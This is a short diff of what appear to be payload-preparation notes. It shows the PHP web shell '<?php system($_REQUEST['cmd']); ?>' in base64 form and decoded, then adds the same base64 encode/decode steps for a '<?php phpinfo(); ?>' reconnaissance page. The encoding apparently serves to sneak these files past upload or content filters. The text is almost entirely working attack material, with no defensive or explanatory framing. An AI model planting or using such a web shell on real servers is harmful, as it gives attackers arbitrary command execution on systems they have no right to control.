@@ -12,3 +12,11 @@ PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo=
                                                                                                       
 echo "PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo=" | base64 -d            
 <?php system($_REQUEST['cmd']); ?>
+
+cat phpinfo.txt
+<?php phpinfo(); ?>
+
+cat phpinfo.txt | base64
+PD9waHAgcGhwaW5mbygpOyA/Pgo=
+
+echo "PD9waHAgcGhwaW5mbygpOyA/Pgo=" | base64 -d
